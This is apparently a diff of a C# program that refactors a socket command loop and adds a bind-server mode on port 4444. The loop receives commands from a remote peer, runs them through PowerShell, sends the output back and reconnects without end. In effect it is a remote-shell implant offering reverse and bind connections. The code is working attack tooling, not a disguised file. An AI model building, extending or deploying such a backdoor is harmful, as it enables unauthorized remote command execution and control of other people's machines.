@@ -67,7 +67,7 @@ namespace myclient
                 }
                 else
                 {
-                    Console.WriteLine("[DEBUG] Need to get more ....");
+                    //Console.WriteLine("[DEBUG] Need to get more ....");
                     int bytesRec = socket.Receive(bytes);
                     t_message = t_message + Encoding.ASCII.GetString(bytes, 0, bytesRec);
 
@@ -75,9 +75,10 @@ namespace myclient
             }
         }
 
-        public void StartClient()
+
+        private void doMagic(Socket sender, IPEndPoint remoteEP, Socket listener)
         {
-            // Data buffer for incoming data.  
+
             byte[] bytes = new byte[1024];
             string command_tag;
             string command;
@@ -86,6 +87,121 @@ namespace myclient
             PsRun myPsRun = new PsRun();
             myPsRun.init();
 
+
+            while (true)
+            {
+
+                try
+                {
+                    Console.WriteLine("Waiting for command tag ...");
+
+                    //int bytesRec = sender.Receive(bytes);
+                    //command_tag = Encoding.ASCII.GetString(bytes, 0, bytesRec);
+                    command_tag = doRecive(sender);
+                    //Console.WriteLine("Recieved Command tag: {0}", command_tag);
+                    byte[] msg = Encoding.ASCII.GetBytes(MsgPack("COMMAND_TAG_SUCCESS"));
+                    int bytesSent = sender.Send(msg);
+                    if (bytesSent != msg.Length)
+                    {
+                        Console.WriteLine("[DEBUG] Something wrong with send");
+                    }
+
+                    Console.WriteLine("Finished sending ACK tag");
+
+                    Console.WriteLine("Trying to get commands ... ");
+                    //bytesRec = sender.Receive(bytes);
+                    //command = Encoding.ASCII.GetString(bytes, 0, bytesRec);
+                    command = doRecive(sender);
+                    //Console.WriteLine("Recieved Command: {0}", command);
+                    msg = Encoding.ASCII.GetBytes(MsgPack("COMMAND_SUCCESS"));
+                    bytesSent = sender.Send(msg);
+                    if (bytesSent != msg.Length)
+                    {
+                        Console.WriteLine("[DEBUG] Something wrong with send");
+                    }
+
+
+                    //check command
+                    if (command_tag.ToLower() == "ps" || command_tag.ToLower() == "powershell")
+                    {
+
+                        string psresult = "";
+                        try
+                        {
+                            psresult = myPsRun.doPsRun(command);
+                        }
+                        catch (Exception e)
+                        {
+
+                            psresult = psresult + "[ERROR]: " + e.Message;
+                        }
+
+
+                        Console.WriteLine("[DEBUG] cmd executed ...");
+                        msg = Encoding.ASCII.GetBytes(MsgPack(psresult));
+                        bytesSent = sender.Send(msg);
+                        if (bytesSent != msg.Length)
+                        {
+                            Console.WriteLine("[DEBUG] Something wrong with send");
+                        }
+                        Console.WriteLine("Send result finished");
+
+                        //get success ack
+                        //bytesRec = sender.Receive(bytes);
+                        //string psAck = Encoding.ASCII.GetString(bytes, 0, bytesRec);
+                        string psAck = doRecive(sender);
+                        Console.WriteLine("[DEBUG] ACK msg: " + psAck);
+                        if (psAck == "PSRUN_SUCCESS")
+                        {
+                            Console.WriteLine("[PsRun] Success");
+                        }
+                        else
+                        {
+                            Console.WriteLine("[PsRun] Failed ...");
+                        }
+
+                    }
+
+
+                    if (command_tag.ToLower() == "exit")
+                    {
+                        break;
+                    }
+                }
+
+                catch (SocketException se)
+                {
+                    Console.WriteLine("SocketException : {0}", se.ToString());
+                    //keep reconnect
+                    while (true)
+                    {
+                        try
+                        {
+                            if (listener == null)
+                            {
+                                sender = new Socket(remoteEP.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+                                sender.Connect(remoteEP);
+                                break;
+                            }
+                            else
+                            {
+                                listener.Listen(1);
+                                Console.WriteLine("Waiting for a connection...");
+                                sender = listener.Accept();
+                                break;
+                            }
+                        }
+                        catch (SocketException se_inner)
+                        {
+                            Console.WriteLine("Keep trying ...");
+                        }
+                    }
+                }
+            }//end of while 
+        }
+
+        public void StartClient()
+        {
 
             //COMMAND_SUCCESS
             //COMMAND_TAG_SUCCESS
@@ -107,107 +223,9 @@ namespace myclient
                 {
                     sender.Connect(remoteEP);
                     Console.WriteLine("Socket connected to {0}", sender.RemoteEndPoint.ToString());
-                    while (true)
-                    {
 
-                        try
-                        {
-                            Console.WriteLine("Waiting for command tag ...");
-
-                            //int bytesRec = sender.Receive(bytes);
-                            //command_tag = Encoding.ASCII.GetString(bytes, 0, bytesRec);
-                            command_tag = doRecive(sender);
-                            //Console.WriteLine("Recieved Command tag: {0}", command_tag);
-                            byte[] msg = Encoding.ASCII.GetBytes(MsgPack("COMMAND_TAG_SUCCESS"));
-                            int bytesSent = sender.Send(msg);
-                            if (bytesSent != msg.Length)
-                            {
-                                Console.WriteLine("[DEBUG] Something wrong with send");
-                            }
-
-                            Console.WriteLine("Finished sending ACK tag");
-
-                            Console.WriteLine("Trying to get commands ... ");
-                            //bytesRec = sender.Receive(bytes);
-                            //command = Encoding.ASCII.GetString(bytes, 0, bytesRec);
-                            command = doRecive(sender);
-                            //Console.WriteLine("Recieved Command: {0}", command);
-                            msg = Encoding.ASCII.GetBytes(MsgPack("COMMAND_SUCCESS"));
-                            bytesSent = sender.Send(msg);
-                            if (bytesSent != msg.Length)
-                            {
-                                Console.WriteLine("[DEBUG] Something wrong with send");
-                            }
-
-
-                            //check command
-                            if (command_tag.ToLower() == "ps" || command_tag.ToLower() == "powershell")
-                            {
-
-                                string psresult = "";
-                                try
-                                {
-                                    psresult = myPsRun.doPsRun(command);
-                                }
-                                catch (Exception e)
-                                {
-
-                                    psresult = psresult + "[ERROR]: " + e.Message;
-                                }
-
-
-                                Console.WriteLine("[DEBUG] cmd executed ...");
-                                msg = Encoding.ASCII.GetBytes(MsgPack(psresult));
-                                bytesSent = sender.Send(msg);
-                                if (bytesSent != msg.Length)
-                                {
-                                    Console.WriteLine("[DEBUG] Something wrong with send");
-                                }
-                                Console.WriteLine("Send result finished");
-
-                                //get success ack
-                                //bytesRec = sender.Receive(bytes);
-                                //string psAck = Encoding.ASCII.GetString(bytes, 0, bytesRec);
-                                string psAck = doRecive(sender);
-                                Console.WriteLine("[DEBUG] ACK msg: " + psAck);
-                                if (psAck == "PSRUN_SUCCESS")
-                                {
-                                    Console.WriteLine("[PsRun] Success");
-                                }
-                                else
-                                {
-                                    Console.WriteLine("[PsRun] Failed ...");
-                                }
-
-                            }
-
-
-                            if (command_tag.ToLower() == "exit")
-                            {
-                                break;
-                            }
-                        }
-
-                        catch (SocketException se)
-                        {
-                            Console.WriteLine("SocketException : {0}", se.ToString());
-                            //keep reconnect
-                            while (true)
-                            {
-                                try
-                                {
-                                    sender = new Socket(remoteEP.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
-                                    sender.Connect(remoteEP);
-                                    break;
-                                }
-                                catch (SocketException se_inner)
-                                {
-                                    Console.WriteLine("Keep trying ...");
-                                }
-                            }
-                        }
-                    }//end of while 
-
+                    //do the magic
+                    doMagic(sender, remoteEP,null);
 
                     // Release the socket.  
                     sender.Shutdown(SocketShutdown.Both);
@@ -226,6 +244,44 @@ namespace myclient
                 Console.WriteLine(e.ToString());
             }
         }
+
+        public void StartServer()
+        {
+
+            try
+            {
+                IPEndPoint localEndPoint = CreateIPEndPoint("127.0.0.1:4444");
+                Socket listener = new Socket(localEndPoint.AddressFamily,SocketType.Stream, ProtocolType.Tcp);
+
+                try
+                {
+                    listener.Bind(localEndPoint);
+                    listener.Listen(1);
+                    Console.WriteLine("Waiting for a connection...");
+                    Socket handler = listener.Accept();
+
+                    doMagic(handler, localEndPoint, listener);
+
+
+                    // Release the socket.  
+                    listener.Shutdown(SocketShutdown.Both);
+                    listener.Close();
+
+
+                }//outer try
+
+                catch (Exception e)
+                {
+                    Console.WriteLine("Unexpected exception : {0}", e.ToString());
+                }
+
+            }//init try
+            catch (Exception e)
+            {
+                Console.WriteLine(e.ToString());
+            }
+
+        }
     }
     
     class Program
@@ -234,7 +290,8 @@ namespace myclient
         static void Main(string[] args)
         {
             MyApp t_app = new MyApp();
-            t_app.StartClient();
+            //t_app.StartClient();
+            t_app.StartServer();
         }
     }
 }
